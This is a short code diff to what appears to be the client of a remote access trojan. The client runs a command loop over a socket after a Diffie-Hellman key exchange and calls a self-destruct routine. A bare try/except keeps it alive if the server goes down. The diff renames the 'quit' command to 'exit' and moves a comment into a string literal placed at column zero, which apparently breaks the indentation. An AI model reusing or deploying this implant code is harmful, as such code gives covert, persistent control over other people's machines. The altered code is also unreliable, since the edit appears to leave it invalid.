@@ -36,7 +36,7 @@ def client_loop(conn, dhkey):
             conn.close()
             toolkit.selfdestruct(PLAT)
 
-        elif cmd == 'quit':
+        elif cmd == 'exit':
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
             break
@@ -104,10 +104,11 @@ def main():
             continue
 
         dhkey = crypto.diffiehellman(conn)
-
-        # This try/except statement makes the client very resilient, but it's
-        # horrible for debugging. It will keep the client alive if the server
-        # is torn down unexpectedly, or if the client freaks out.
+"""
+        This try/except statement makes the client very resilient, but it's
+        horrible for debugging. It will keep the client alive if the server
+        is torn down unexpectedly, or if the client freaks out.
+        """
         try:
             exit_status = client_loop(conn, dhkey)
         except: pass
